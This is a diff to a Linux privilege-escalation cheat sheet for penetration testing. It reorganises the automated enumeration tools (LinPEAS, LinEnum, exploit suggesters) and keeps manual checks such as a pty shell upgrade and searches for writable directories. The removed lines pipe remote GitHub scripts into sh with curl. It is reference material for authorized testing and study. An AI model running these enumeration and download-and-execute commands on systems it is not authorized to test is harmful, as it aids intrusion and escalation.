@@ -12,6 +12,34 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg; export TERM=xterm
 ```
 
+# Automated Enumeration
+
+## LinPEAS (Kali Source)
+```
+/usr/share/peass/linpeas/linpeas.sh
+```
+on kali. Transfer to target and tee to output file.
+
+## LinEnum (GitHub Source)
+```bash
+https://github.com/rebootuser/LinEnum
+```
+
+## Linux Exploit Suggester (Source)
+```
+/usr/share/linux-exploit-suggester
+```
+## Unix-Privesc-Check (GitHub Source)
+```
+https://github.com/pentestmonkey/unix-privesc-check
+```
+## Run unix-privesc-check for automated enumeration
+```bash
+unix-privesc-check standard > output.txt
+```
+
+
+# Manual Enumeration
 ## Check current user and group memberships
 ```bash
 id
@@ -68,6 +96,7 @@ ip route
 ```bash
 ss -antup
 ```
+Check for ports that are only accessible internally. They may run vulnerable services that can be abused for privilege escalation.
 
 ## Check iptables firewall rules
 ```bash
@@ -146,7 +175,6 @@ Use zip2john and crack if applicable.
 find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$"
 ```
 ``
-
 ## Find nonempty directories
 Automated tools may miss unusual directories. Same time when `tree` isn't available.
 ```
@@ -155,8 +183,6 @@ find . -type d ! -empty
 
 ## Find all writable directories
 ```bash
-#find / -perm -222 -type d 2>/dev/null
-#find / -perm -o w -type d 2>/dev/null
 find / -writable -type d 2>/dev/null
 ```
 
@@ -207,36 +233,6 @@ cat /etc/profile
 cat ~/.bashrc
 cat ~/.profile
 cat ~/.bash_profile
-```
-
-## Run unix-privesc-check for automated enumeration
-```bash
-unix-privesc-check standard > output.txt
-unix-privesc-check detailed > output.txt
-```
-
-
-## LinPEAS (Kali Source)
-```
-/usr/share/peass/linpeas/linpeas.sh
-```
-on kali. Transfer to target and tee to output file.
-
-## Download and run LinEnum
-
-```bash
-curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-chmod +x LinEnum.sh
-./LinEnum.sh
-```
-
-## Download and run Linux Exploit Suggester
-```bash
-curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-chmod +x linux-exploit-suggester.sh
-./linux-exploit-suggester.sh
 ```
 
 ## Check sudo permissions
